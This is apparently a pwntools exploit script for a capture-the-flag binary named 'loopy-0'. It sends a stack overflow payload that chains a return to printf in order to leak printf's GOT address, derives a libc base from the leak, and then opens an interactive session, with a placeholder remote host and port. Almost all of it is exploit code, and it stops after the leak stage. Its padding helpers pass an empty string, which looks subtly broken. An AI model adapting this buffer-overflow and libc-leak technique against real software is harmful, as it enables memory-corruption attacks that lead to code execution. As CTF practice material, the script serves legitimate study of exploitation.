#!/usr/bin/python2
#-*-coding:utf-8-*-
from pwn import *
from PwnContext import *

try:
    from IPython import embed as ipy
except ImportError:
    print ('IPython not installed.')

context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
context.log_level = 'debug'
# functions for quick script
s       = lambda data               :ctx.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data))
sl      = lambda data               :ctx.sendline(str(data))
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :ctx.recv(numb)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, ''))
uu64    = lambda data   :u64(data.ljust(8, ''))

ctx.binary = './loopy-0'
ctx.remote_libc = './libc.so.6'
ctx.remote = ('1.1.1.1', 1111)
ctx.debug_remote_libc = True # True for debugging remote libc, false for local.
elf = ELF('./loopy-0')
printplt = elf.symbols['printf']
main_addr = 0x080491E7
printgot = elf.got['printf']

junk = 'A' * 72 + 'B' * 4

log.success('printplt : {}'.format(hex(printplt)))
log.success('printgot : {}'.format(hex(printgot)))

payload = junk + p32(printplt) + p32(main_addr) + p32(printgot)


rs()
# rs('remote') # uncomment this for exploiting remote target
ru('Type something>')
sl(payload)
#print(r())
leaked_printf = u32(r()[99:103])
print(hex(leaked_printf))
libc_base = leaked_printf - 0x52cb0


irt()

